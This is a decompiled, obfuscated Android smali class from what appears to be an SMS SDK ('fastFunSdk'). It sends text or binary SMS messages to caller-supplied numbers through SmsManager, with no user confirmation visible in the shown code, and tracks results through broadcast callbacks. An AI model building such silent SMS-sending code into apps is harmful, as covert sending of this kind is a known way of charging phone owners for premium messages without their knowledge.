.class public final Lcom/xs/hszp/mm318/b/e;
.super Ljava/lang/Object;


# static fields
.field private static final a:Ljava/util/Map;

.field private static final b:Ljava/util/Map;

.field private static final c:Ljava/util/Map;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    new-instance v0, Ljava/util/HashMap;

    invoke-direct {v0}, Ljava/util/HashMap;-><init>()V

    sput-object v0, Lcom/xs/hszp/mm318/b/e;->a:Ljava/util/Map;

    new-instance v0, Ljava/util/HashMap;

    invoke-direct {v0}, Ljava/util/HashMap;-><init>()V

    sput-object v0, Lcom/xs/hszp/mm318/b/e;->b:Ljava/util/Map;

    new-instance v0, Ljava/util/HashMap;

    invoke-direct {v0}, Ljava/util/HashMap;-><init>()V

    sput-object v0, Lcom/xs/hszp/mm318/b/e;->c:Ljava/util/Map;

    return-void
.end method

.method static synthetic a(ILcom/xs/hszp/mm318/b/j;)V
    .locals 0

    invoke-static {p0, p1}, Lcom/xs/hszp/mm318/b/e;->b(ILcom/xs/hszp/mm318/b/j;)V

    return-void
.end method

.method static synthetic a(Landroid/content/BroadcastReceiver;Landroid/content/Context;)V
    .locals 1

    :try_start_0
    invoke-virtual {p1, p0}, Landroid/content/Context;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    return-void

    :catch_0
    move-exception v0

    goto :goto_0
.end method

.method public static a(Landroid/content/Context;Ljava/lang/String;[BLcom/xs/hszp/mm318/b/i;)V
    .locals 5

    const/4 v4, 0x0

    sget-object v0, Lcom/xs/hszp/mm318/b/k;->b:Lcom/xs/hszp/mm318/b/k;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v2

    invoke-static {v2, v3}, Ljava/lang/String;->valueOf(J)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v2, "_"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    new-instance v2, Ljava/util/Random;

    invoke-direct {v2}, Ljava/util/Random;-><init>()V

    invoke-virtual {v2}, Ljava/util/Random;->nextDouble()D

    move-result-wide v2

    invoke-virtual {v1, v2, v3}, Ljava/lang/StringBuilder;->append(D)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    sget-object v2, Lcom/xs/hszp/mm318/b/e;->a:Ljava/util/Map;

    invoke-interface {v2, v1, v4}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    sget-object v2, Lcom/xs/hszp/mm318/b/e;->b:Ljava/util/Map;

    invoke-interface {v2, v1, p3}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    new-instance v2, Lcom/xs/hszp/mm318/b/j;

    invoke-direct {v2}, Lcom/xs/hszp/mm318/b/j;-><init>()V

    iput-object v1, v2, Lcom/xs/hszp/mm318/b/j;->a:Ljava/lang/String;

    iput-object p0, v2, Lcom/xs/hszp/mm318/b/j;->b:Landroid/content/Context;

    iput-object v0, v2, Lcom/xs/hszp/mm318/b/j;->c:Lcom/xs/hszp/mm318/b/k;

    iput-object p1, v2, Lcom/xs/hszp/mm318/b/j;->d:Ljava/lang/String;

    iput-object v4, v2, Lcom/xs/hszp/mm318/b/j;->e:Ljava/lang/String;

    const/4 v0, 0x0

    iput-short v0, v2, Lcom/xs/hszp/mm318/b/j;->f:S

    iput-object p2, v2, Lcom/xs/hszp/mm318/b/j;->g:[B

    const-wide/16 v0, 0x0

    iput-wide v0, v2, Lcom/xs/hszp/mm318/b/j;->h:J

    iput-object v4, v2, Lcom/xs/hszp/mm318/b/j;->i:Ljava/lang/Object;

    iput-object p3, v2, Lcom/xs/hszp/mm318/b/j;->j:Lcom/xs/hszp/mm318/b/i;

    const/4 v0, 0x1

    invoke-static {v0, v2}, Lcom/xs/hszp/mm318/b/e;->b(ILcom/xs/hszp/mm318/b/j;)V

    return-void
.end method

.method static synthetic a(Lcom/xs/hszp/mm318/b/j;Landroid/content/BroadcastReceiver;)V
    .locals 7

    :try_start_0
    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "com.fastFunSdk.send.sms"

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v1, p0, Lcom/xs/hszp/mm318/b/j;->a:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    new-instance v0, Landroid/content/IntentFilter;

    invoke-direct {v0, v1}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    iget-object v2, p0, Lcom/xs/hszp/mm318/b/j;->b:Landroid/content/Context;

    invoke-virtual {v2, p1, v0}, Landroid/content/Context;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;

    move-result-object v0

    new-instance v2, Landroid/content/Intent;

    invoke-direct {v2, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    iget-object v1, p0, Lcom/xs/hszp/mm318/b/j;->b:Landroid/content/Context;

    const/4 v3, 0x0

    const/4 v4, 0x0

    invoke-static {v1, v3, v2, v4}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v5

    iget-object v1, p0, Lcom/xs/hszp/mm318/b/j;->c:Lcom/xs/hszp/mm318/b/k;

    sget-object v2, Lcom/xs/hszp/mm318/b/k;->b:Lcom/xs/hszp/mm318/b/k;

    if-ne v1, v2, :cond_0

    iget-object v1, p0, Lcom/xs/hszp/mm318/b/j;->d:Ljava/lang/String;

    const/4 v2, 0x0

    iget-short v3, p0, Lcom/xs/hszp/mm318/b/j;->f:S

    iget-object v4, p0, Lcom/xs/hszp/mm318/b/j;->g:[B

    const/4 v6, 0x0

    invoke-virtual/range {v0 .. v6}, Landroid/telephony/SmsManager;->sendDataMessage(Ljava/lang/String;Ljava/lang/String;S[BLandroid/app/PendingIntent;Landroid/app/PendingIntent;)V

    :goto_0
    return-void

    :cond_0
    iget-object v2, p0, Lcom/xs/hszp/mm318/b/j;->d:Ljava/lang/String;

    const/4 v3, 0x0

    iget-object v4, p0, Lcom/xs/hszp/mm318/b/j;->e:Ljava/lang/String;

    const/4 v6, 0x0

    move-object v1, v0

    invoke-virtual/range {v1 .. v6}, Landroid/telephony/SmsManager;->sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    iget-object v0, p0, Lcom/xs/hszp/mm318/b/j;->a:Ljava/lang/String;

    const/4 v1, 0x1

    invoke-static {v0, v1}, Lcom/xs/hszp/mm318/b/e;->b(Ljava/lang/String;I)V

    goto :goto_0
.end method

.method static synthetic a(Ljava/lang/String;I)V
    .locals 0

    invoke-static {p0, p1}, Lcom/xs/hszp/mm318/b/e;->b(Ljava/lang/String;I)V

    return-void
.end method

.method private static b(ILcom/xs/hszp/mm318/b/j;)V
    .locals 4

    new-instance v0, Lcom/xs/hszp/mm318/b/h;

    invoke-direct {v0, p1, p0}, Lcom/xs/hszp/mm318/b/h;-><init>(Lcom/xs/hszp/mm318/b/j;I)V

    new-instance v1, Lcom/xs/hszp/mm318/b/f;

    invoke-direct {v1, p1, v0}, Lcom/xs/hszp/mm318/b/f;-><init>(Lcom/xs/hszp/mm318/b/j;Landroid/content/BroadcastReceiver;)V

    iget-wide v2, p1, Lcom/xs/hszp/mm318/b/j;->h:J

    invoke-static {v1, v2, v3}, Lcom/xs/hszp/mm318/b/n;->a(Ljava/lang/Runnable;J)V

    return-void
.end method

.method static synthetic b(Lcom/xs/hszp/mm318/b/j;Landroid/content/BroadcastReceiver;)V
    .locals 3

    new-instance v0, Lcom/xs/hszp/mm318/b/g;

    invoke-direct {v0, p1, p0}, Lcom/xs/hszp/mm318/b/g;-><init>(Landroid/content/BroadcastReceiver;Lcom/xs/hszp/mm318/b/j;)V

    const-wide/16 v1, 0x7530

    invoke-static {v0, v1, v2}, Lcom/xs/hszp/mm318/b/n;->a(Ljava/lang/Runnable;J)V

    return-void
.end method

.method private static b(Ljava/lang/String;I)V
    .locals 2

    sget-object v0, Lcom/xs/hszp/mm318/b/e;->b:Ljava/util/Map;

    invoke-interface {v0, p0}, Ljava/util/Map;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Lcom/xs/hszp/mm318/b/i;

    if-eqz v0, :cond_0

    sget-object v1, Lcom/xs/hszp/mm318/b/e;->a:Ljava/util/Map;

    invoke-interface {v1, p0}, Ljava/util/Map;->get(Ljava/lang/Object;)Ljava/lang/Object;

    :try_start_0
    sget-object v1, Lcom/xs/hszp/mm318/b/e;->b:Ljava/util/Map;

    invoke-interface {v1, p0}, Ljava/util/Map;->remove(Ljava/lang/Object;)Ljava/lang/Object;

    sget-object v1, Lcom/xs/hszp/mm318/b/e;->a:Ljava/util/Map;

    invoke-interface {v1, p0}, Ljava/util/Map;->remove(Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    invoke-interface {v0, p1}, Lcom/xs/hszp/mm318/b/i;->a(I)V

    :cond_0
    return-void

    :catch_0
    move-exception v1

    goto :goto_0
.end method
